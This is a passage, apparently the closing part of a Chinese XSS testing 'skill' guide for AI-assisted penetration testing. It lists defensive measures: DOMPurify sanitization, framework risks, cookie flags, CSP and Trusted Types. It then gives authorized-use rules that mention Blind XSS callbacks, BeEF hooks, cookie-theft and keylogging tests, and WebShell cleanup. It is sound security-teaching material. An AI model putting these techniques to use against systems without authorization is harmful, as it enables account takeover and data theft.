- **同一上下文消毒**：`sanitize()`输出只用于innerHTML插入；禁止拼入模板/script.text/属性/svgElement
- **消毒后再验证**：消毒→序列化→再解析→检查活动节点（防御mXSS类）
- **固定最新版本**：DOMPurify持续修复mXSS（2024-2026年10+个CVE），版本锁定在旧版=留后门
- **警惕自定义配置放宽**：`ALLOWED_TAGS`/`CUSTOM_ELEMENT_HANDLING`/`IN_PLACE` 均产生历史绕过面

### 15.5 框架与库安全
- 避免`dangerouslySetInnerHTML`/`v-html`/`{@html}`/`bypassSecurityTrustAs*`，必须用时前置消毒+URL协议白名单
- 不使用用户可控模板编译（Vue template/Angular动态组件）
- SSR/Hydration JSON序列化使用安全库（防`</script>`逃逸）
- 及时升级：jQuery≥3.5（CVE-2020-11022/11023）、Vue 3（Vue 2已EOL，CVE-2024-6783）、Bootstrap≥4（CVE-2025-1647）
- npm audit/Snyk定期检查前端供应链

### 15.6 Cookie与会话安全
- HttpOnly + Secure + SameSite=Strict（或Lax）
- 敏感操作二次验证（密码/OTP），降低ATO风险
- 即使Cookie安全，XSS仍可CSRF/读取页面——会话安全不能替代输出编码

### 15.7 纵深防御组合拳（按优先级）
1. **上下文感知输出编码**（消除根因）
2. **严格CSP + Trusted Types**（纵深阻断）
3. **HttpOnly/SameSite Cookie**（减轻会话风险）
4. **WAF语义分析**（不依赖签名，用语义/解析一致性检测）
5. **CSP report-only + TT违规上报**（持续监测绕过）
6. **AI驱动的WAF规则自动更新**（对抗AI生成payload，GenXSS模式）

## 注意事项

- **仅限授权测试/合规声明**：本技能全部技术仅可用于**已获得书面授权的目标系统**（授权渗透测试、红队演练、自有资产安全评估、CTF/靶场环境）。未经授权对任何系统进行XSS测试、Blind XSS回连、BeEF hook、账户接管链验证均属违法行为，违反《中华人民共和国网络安全法》第二十七条、第四十四条及《刑法》第二百八十五条（非法侵入计算机信息系统罪/非法获取计算机信息系统数据罪）。**禁止**对未授权目标使用AI自动化盲打/批量扫描。
- **最小影响原则**：优先使用无害探测（`alert(document.domain)`/DNS回连/唯一标识canary），确认漏洞后再评估是否升级利用；避免在生产环境执行破坏性操作
- **数据保护**：测试Cookie窃取/键盘记录时不得收集真实用户数据，使用测试账号与模拟数据
- **存储型XSS危害放大**：影响所有访问用户，测试时在隔离环境/测试账号下进行，测试后立即清理注入内容
- **Blind XSS等待时间**：后台触发可能延迟数小时至数天，等待时间需充足
- **浏览器差异**：HTML/JS解析跨浏览器存在差异（mXSS尤其明显），关键payload需Chrome/Firefox/Safari/Edge多浏览器验证
- **AI工具使用边界**：AI生成的payload必须本地验证后再投递；禁止让LLM直接访问目标系统做未授权测试；AI输出可能包含不可预测行为，需人工复核
- **0day/浏览器漏洞谨慎**：浏览器内核漏洞利用属最高风险操作，仅在明确授权的高价值红队任务中、隔离环境验证后使用
- **痕迹清理**：测试完成后删除所有注入数据、上传文件、WebShell、注册的Service Worker
- **漏洞报告**：及时向甲方提交包含影响面、利用链、复现步骤、修复建议的完整报告
- **情报时效性**：CSP绕过/DOMPurify绕过/mXSS变体更新频繁，定期跟踪：PortSwigger Research、cure53/DOMPurify Wiki（Attack Classes & Bypass History）、Google Project Zero、MSRC XSS系列、arXiv GenXSS
- **遵守SRC/赏金规则**：参与漏洞赏金时严格遵守项目范围（Scope）、禁止测试项（如DoS、社工）、报告规范

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
